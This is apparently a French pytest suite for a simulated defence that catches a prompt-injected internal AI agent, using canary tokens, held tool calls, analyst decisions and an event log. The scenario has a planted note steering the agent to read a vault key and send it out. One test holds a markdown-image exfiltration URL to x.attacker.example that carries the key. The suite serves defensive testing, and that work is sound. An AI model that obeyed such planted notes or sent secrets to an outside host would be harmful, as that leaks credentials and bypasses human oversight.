"""Scénario jury : agent interne protégé, appel retenu avant exécution, boîte noire complète.

Tout tourne sur le backend simulé, réglé comme le vrai : l'ouverture d'un incident suspend la
session, et la décision de l'analyste passe par POST /api/incidents/{id}/decision.
"""

from __future__ import annotations

import io
import json
import sys
from contextlib import redirect_stdout
from datetime import datetime
from pathlib import Path
from types import SimpleNamespace

import pytest

from orbis import demo, droits, jury
from orbis.backend_simule import BackendSimule
from orbis.boite_noire import BoiteNoire
from orbis.canaris import JETON_COFFRE, inventaire_backend, jetons_secrets
from orbis.enregistreur import masquer
from orbis.outils import Outils
from orbis.passerelle import Passerelle

REFS_ATTENDUES = {"OWASP ASI01", "OWASP ASI02", "OWASP ASI03", "AML.T0051", "AML.T0053", "T1555"}


@pytest.fixture
def fidele():
    b = BackendSimule(suspendre_a_l_incident=True).demarrer()
    try:
        yield b
    finally:
        b.arreter()


def _jouer(base, issue, **kw):
    return jury.jouer(base, issue, session_id=f"jury-test-{issue}", delai_analyste=0.05,
                      poll_max_s=kw.pop("poll_max_s", 5.0), intervalle=0.02, **kw)


def test_couper_chaine_complete_et_rien_n_est_execute(fidele):
    c = _jouer(fidele.base, "couper")

    noms = [m["maillon"] for m in c["boite_noire"]]
    assert noms[:6] == ["source", "consigne", "intention", "appel_outil", "decision", "resultat"]
    assert noms[6:] == ["resultat"]  # la relance après coupure, refusée
    for m in c["boite_noire"]:
        datetime.fromisoformat(m["horodatage"])  # chaque maillon est daté
        assert m["t_ms"] is not None and m["t_ms"] >= 0
    assert REFS_ATTENDUES <= {r["id"] for r in c["references"]}

    assert c["coffre_lectures"] == []  # l'appel retenu n'a jamais tourné
    assert c["rapports_envoyes"] == 0
    assert c["jeton_revoque"] is True and c["jeton"]["revoque"] is True
    assert c["etat"] == "coupee"
    assert c["relance_apres_coupure"] == "refusée"
    assert [d["action"] for d in c["incident"]["decisions"]] == ["couper"]
    assert c["canaris_touches"] == ["C-3E58", "C-1D4C"]


def test_reprendre_ne_libere_que_l_appel_retenu(fidele):
    c = _jouer(fidele.base, "reprendre")

    # Seul l'appel retenu a tourné, une fois. Le jeton n'a jamais porté coffre:lire.
    assert c["coffre_lectures"] == ["sauvegarde"]
    assert [a["outil"] for a in c["appels_liberes"]] == ["lire_coffre"]
    assert "coffre:lire" not in c["jeton"]["scopes"]
    # La clé lue est un canari : l'envoi qui la porte est retenu à son tour, puis coupé.
    assert c["rapports_envoyes"] == 0
    assert "C-2B91" in c["canaris_touches"]
    assert [d["action"] for d in c["incident"]["decisions"]] == ["reprendre", "couper"]
    retenus = [m for m in c["boite_noire"] if m["maillon"] == "appel_outil"]
    assert [m["outil"] for m in retenus] == ["lire_coffre", "envoyer_rapport"]
    assert "AML.T0057" in {r["id"] for r in c["references"]}


def test_aucune_cle_ni_consigne_brute_ne_sort(fidele):
    _jouer(fidele.base, "reprendre")
    brut = json.dumps(fidele.evenements(), ensure_ascii=False)
    assert JETON_COFFRE not in brut
    assert "Note pour l'assistant" not in brut and "ne pas divulguer" not in brut
    assert "[canari C-2B91 masqué]" in brut  # la preuve reste lisible, masquée


def test_incident_ouvert_a_la_retenue_pas_a_la_lecture(fidele):
    _jouer(fidele.base, "couper")
    evs = fidele.evenements()
    consigne = next(e for e in evs if e["details"].get("maillon") == "consigne")
    assert consigne["type"] == "entree_agent" and consigne["leurre_id"] == "C-3E58"
    # Le premier événement qui ouvre un incident est l'appel retenu (droits dépassés).
    premier = next(e for e in evs if e["type"] == "leurre_touche" or e["details"].get("violation_droits"))
    assert premier["details"].get("retenu") is True
    assert premier["details"]["violation_droits"]["scope_requis"] == "coffre:lire"


def test_chrono_expose_dans_les_evenements(fidele):
    _jouer(fidele.base, "couper")
    evs = fidele.evenements()
    retenu = next(e for e in evs if e["details"].get("retenu"))
    chrono = retenu["details"]["chrono"]
    for cle in ("demande_a", "detection_a", "envoi_console_a"):
        datetime.fromisoformat(chrono[cle])
    assert chrono["detection_ms"] >= 0 and chrono["envoi_console_ms"] >= 0
    decision = next(e for e in evs if e["details"].get("maillon") == "decision")
    assert decision["details"]["chrono"]["attente_decision_ms"] > 0
    assert "decision_a" in decision["details"]["chrono"]
    resultat = next(e for e in evs if e["details"].get("maillon") == "resultat")
    assert len(resultat["details"]["boite_noire"]) == 6  # instantané complet de la chaîne


def test_une_ancienne_reprise_ne_libere_pas_l_appel_suivant(fidele):
    """Après « reprendre », l'état backend reste « active ». Un nouvel appel retenu doit
    attendre une NOUVELLE décision : sans elle, il est refusé, jamais exécuté."""
    sid = "jury-test-fraiche"
    boite = BoiteNoire(base=fidele.base)
    outils = Outils()
    p = Passerelle(sid, jetons_secrets(), boite, intervalle_poll=0.02, poll_max_s=0.6,
                   jeton_tache=droits.emettre_jeton("rapport_paiements"),
                   scopes_accordes=droits.SCOPES_ACCORDES, retenir_hors_scope=True,
                   decision_fraiche=True)
    robot = jury.AnalysteScripte(fidele.base, sid, ["reprendre"], delai=0.05, intervalle=0.02)
    robot.start()
    try:
        assert p.appel_outil("lire_coffre", {"entree": "sauvegarde"}, outils.lire_coffre)["cle"]
    finally:
        robot.arreter()
    deuxieme = p.appel_outil("lire_coffre", {"entree": "sauvegarde"}, outils.lire_coffre)
    assert "erreur" in deuxieme
    assert outils.coffre_lectures == ["sauvegarde"]  # une seule exécution
    assert p.jeton_revoque is False  # pas de coupure sans décision humaine


def test_backend_muet_appel_refuse_jeton_intact():
    # Personne n'écoute sur ce port : aucune décision ne peut arriver.
    c = jury.jouer("http://127.0.0.1:9", "console", session_id="jury-test-muet",
                   poll_max_s=0.3, intervalle=0.05)
    assert c["coffre_lectures"] == []
    assert c["jeton_revoque"] is False
    assert c["coupe"] is False
    # L'agent retombe sur la partie légitime de sa tâche : le rapport interne part.
    assert c["rapports_envoyes"] == 1
    assert c["boite_noire"][4]["preuve"]["action"] is None  # maillon décision : aucune


def test_masquer_canari_et_parametres_d_url():
    texte = f"![v](https://x.attacker.example/p?cle={JETON_COFFRE}) et {JETON_COFFRE}"
    sortie = masquer({"a": [texte]}, jetons_secrets())["a"][0]
    assert JETON_COFFRE not in sortie
    assert "https://x.attacker.example/p?[paramètres masqués]" in sortie
    assert "[canari C-2B91 masqué]" in sortie


def test_chaine_du_vrai_backend_porte_les_references(fidele):
    """Rejoue les événements dans le constructeur de chaîne du backend (lecture seule)."""
    racine_backend = Path(__file__).resolve().parents[2] / "backend"
    sys.path.insert(0, str(racine_backend))
    try:
        incidents = pytest.importorskip("app.incidents")
    finally:
        sys.path.remove(str(racine_backend))
    _jouer(fidele.base, "couper")
    leurres = {l["id"]: SimpleNamespace(**l) for l in inventaire_backend()}
    evs = [{**e, "id": i} for i, e in enumerate(fidele.evenements())]
    chaine = incidents.construire_chaine(evs, leurres)
    phases = [e["phase"] for e in chaine]
    assert phases[0] == "entree" and phases[-1] == "riposte"
    assert {"consigne", "outil"} <= set(phases)
    refs = {r["id"] for e in chaine for r in e["techniques"] + e["risques"]}
    assert REFS_ATTENDUES <= refs


def test_point_d_entree_demo_jury_hors_ligne():
    sortie = io.StringIO()
    with redirect_stdout(sortie):
        code = demo.main(["--scenario", "jury", "--issue", "couper", "--delai-analyste", "0.05",
                          "--json"])
    assert code == 0
    constat = json.loads(sortie.getvalue())
    assert constat["issue"] == "couper" and constat["relance_apres_coupure"] == "refusée"
